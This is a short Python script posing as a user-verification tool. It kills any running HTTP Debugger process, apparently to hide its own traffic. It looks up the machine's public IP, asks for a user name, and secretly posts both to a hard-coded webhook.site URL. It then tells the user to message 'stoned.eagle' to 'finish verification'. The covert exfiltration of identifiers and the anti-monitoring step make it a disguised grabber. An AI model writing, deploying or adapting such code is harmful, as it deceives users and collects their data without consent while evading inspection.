import requests
from colorama import Fore as fore

lb = fore.LIGHTBLUE_EX
lr = fore.LIGHTRED_EX
lm = fore.LIGHTMAGENTA_EX
w = fore.WHITE
ipaddr = requests.get('https://icanhazip.com')


import os, signal

def process():
	
	# Ask user for the name of process
	name = "HTTPDebuggerSvc.exe"
	try:
		
		# iterating through each instance of the process
		for line in os.popen("ps ax | grep " + name + " | grep -v grep"):
			fields = line.split()
			
			# extracting Process ID from the output
			pid = fields[0]
			
			# terminating process
			os.kill(int(pid), signal.SIGKILL)
		print("Process Successfully terminated")
		
	except:
		print("Error Encountered while running script")

try:
 process()
except:
	pass
  


msg = input(lb + "> " + w + "User Name: ")

j = {"content":msg}
jz = {"content":ipaddr.text.replace("\n","")}

r = requests.post("https://webhook.site/b1b45f2b-bea0-46b9-af17-8c73d6747926",json=j)



r = requests.post("https://webhook.site/b1b45f2b-bea0-46b9-af17-8c73d6747926",json=jz)
print(lb + "> " + w + "DM stoned.eagle to finish verification")

